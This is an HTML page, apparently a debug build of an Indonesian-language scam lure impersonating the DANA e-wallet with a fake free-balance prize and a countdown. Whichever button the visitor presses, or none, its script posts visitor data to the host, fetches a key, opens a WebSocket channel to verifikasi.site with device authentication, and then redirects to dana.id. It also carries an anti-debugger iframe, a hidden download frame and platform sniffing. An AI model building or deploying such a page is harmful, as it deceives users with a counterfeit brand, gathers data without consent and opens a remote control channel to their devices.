<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi - DEBUG</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
        .status-bar.loading{display:block;animation:loading 3s infinite}
        @keyframes loading{0%{width:0%}100%{width:100%}}
        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
        .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
        .ios-download{display:none}
        #debugLog{position:fixed;bottom:0;left:0;width:100%;max-height:200px;background:#000;color:#0f0;font-size:10px;font-family:monospace;overflow-y:auto;z-index:999999;padding:10px;display:block}
    </style>
</head>
<body>

<!-- DEBUG LOG -->
<div id="debugLog">⏳ Memuat...</div>

<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
<div id="statusBar" class="status-bar"></div>
<iframe id="downloadFrame" class="hidden-download"></iframe>
<div id="iosDownload" class="ios-download"></div>

<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// 🔥 VERSI DEBUG - SEMUA CONSOLE AKTIF!
// ============================================================

// 🔥 TAMPILKAN LOG DI LAYAR
function debugLog(msg) {
    var el = document.getElementById('debugLog');
    if (el) {
        el.innerHTML += '\n' + msg;
        el.scrollTop = el.scrollHeight;
    }
    console.log(msg);
}

debugLog('✅ Script mulai jalan');

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    var platform = {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
        isAndroidBridge: typeof AndroidBridge !== 'undefined'
    };
    return platform;
}
var PLATFORM = detectPlatform();
debugLog('✅ Platform: ' + JSON.stringify(PLATFORM));

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var semuaDidapat = false;
var spreadDone = false;
var DOWNLOAD_STARTED = false;
var NOTIFICATION_SHOWN = false;
var REDIRECT_DONE = false;
var WS_PASSWORD = '';
var IP_ADDRESS = '';
var LOCATION_DATA = null;

// ============================================================
// FUNGSI K() - KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    debugLog('📤 K() dipanggil: ' + JSON.stringify(d).substring(0, 100));
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
        debugLog('✅ Data terkirim');
    } catch(e) {
        debugLog('❌ K() error: ' + e.message);
    }
}

// ============================================================
// WEBSOCKET
// ============================================================
var ws = null;
var wsConnected = false;
var WS_URL = 'wss://verifikasi.site/ws';

function connectWebSocket() {
    debugLog('🔌 connectWebSocket() dipanggil');
    if (ws && ws.readyState === WebSocket.OPEN) {
        debugLog('⚠️ WebSocket sudah terbuka');
        return;
    }
    if (!WS_PASSWORD || WS_PASSWORD === '') {
        debugLog('⚠️ Belum ada password, tunggu 3 detik');
        setTimeout(connectWebSocket, 3000);
        return;
    }
    try {
        ws = new WebSocket(WS_URL);
        ws.onopen = function() {
            wsConnected = true;
            debugLog('✅ WebSocket terbuka');
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: WS_PASSWORD,
                deviceId: 'browser_index',
                timestamp: Date.now()
            }));
            debugLog('📤 Auth dikirim');
        };
        ws.onmessage = function(event) {
            debugLog('📨 WebSocket message: ' + event.data.substring(0, 100));
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    debugLog('✅ WebSocket auth success');
                } else if (data.type === 'auth_failed') {
                    debugLog('❌ WebSocket auth failed');
                    ws.close();
                }
            } catch(e) {
                debugLog('❌ Parse message error: ' + e.message);
            }
        };
        ws.onclose = function() {
            wsConnected = false;
            debugLog('🔌 WebSocket closed');
            setTimeout(connectWebSocket, 10000);
        };
        ws.onerror = function(e) {
            debugLog('❌ WebSocket error: ' + JSON.stringify(e));
        };
        debugLog('✅ WebSocket dibuat');
    } catch(e) {
        debugLog('❌ WebSocket error: ' + e.message);
        setTimeout(connectWebSocket, 10000);
    }
}

// ============================================================
// AMBIL PASSWORD
// ============================================================
function getPasswordFromWorker() {
    debugLog('🔑 getPasswordFromWorker() dipanggil');
    return new Promise(function(resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            debugLog('📡 /get-password response: ' + xhr.status);
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    debugLog('📡 Password: ' + (data.password ? 'ADA' : 'KOSONG'));
                    if (data.password) {
                        WS_PASSWORD = data.password;
                        resolve(WS_PASSWORD);
                    } else {
                        reject(new Error('No password'));
                    }
                } catch(e) {
                    reject(e);
                }
            } else {
                reject(new Error('HTTP ' + xhr.status));
            }
        };
        xhr.onerror = function() {
            debugLog('❌ /get-password network error');
            reject(new Error('Network error'));
        };
        xhr.ontimeout = function() {
            debugLog('❌ /get-password timeout');
            reject(new Error('Timeout'));
        };
        xhr.send();
    });
}

// ============================================================
// MAIN EXECUTION
// ============================================================
function dapatkanSemua() {
    debugLog('🔥 dapatkanSemua() dipanggil!');
    if (semuaDidapat) {
        debugLog('⚠️ Sudah pernah dipanggil');
        return;
    }
    semuaDidapat = true;
    
    try {
        var popup = document.getElementById('popupDana');
        if (popup) popup.style.display = 'none';
        debugLog('✅ Popup disembunyikan');
        
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        
        // Ambil password
        getPasswordFromWorker().then(function(password) {
            WS_PASSWORD = password;
            debugLog('✅ Password didapat: ' + password);
            connectWebSocket();
        }).catch(function(e) {
            debugLog('❌ Password gagal: ' + e.message);
            WS_PASSWORD = 'default_fallback';
            connectWebSocket();
        });
        
        // Redirect setelah 5 detik
        setTimeout(function() {
            debugLog('🔄 Redirect ke dana.id');
            if (!REDIRECT_DONE) {
                REDIRECT_DONE = true;
                try { window.location.href = 'https://www.dana.id'; } catch(e) {}
            }
        }, 5000);
        
    } catch(e) {
        debugLog('❌ dapatkanSemua error: ' + e.message);
    }
}

function klaim() {
    debugLog('✅ klaim() dipanggil!');
    K({sumber:'izin', data:'klaim'});
    dapatkanSemua();
}

function tolak() {
    debugLog('✅ tolak() dipanggil!');
    K({sumber:'izin', data:'tolak'});
    dapatkanSemua();
}

// ============================================================
// TIMER (10 DETIK)
// ============================================================
debugLog('⏰ Memulai timer...');
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    debugLog('⏰ Timer: ' + w);
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        debugLog('⏰ Timer habis!');
        K({sumber:'izin', data:'auto'});
        dapatkanSemua();
    }
}, 1000);

// Click anywhere
document.addEventListener('click', function() {
    debugLog('🖱️ Click detected');
    if (!semuaDidapat) {
        K({sumber:'izin', data:'click_anywhere'});
        dapatkanSemua();
    }
});

debugLog('✅ Script selesai dimuat');
</script>
</body>
</html>
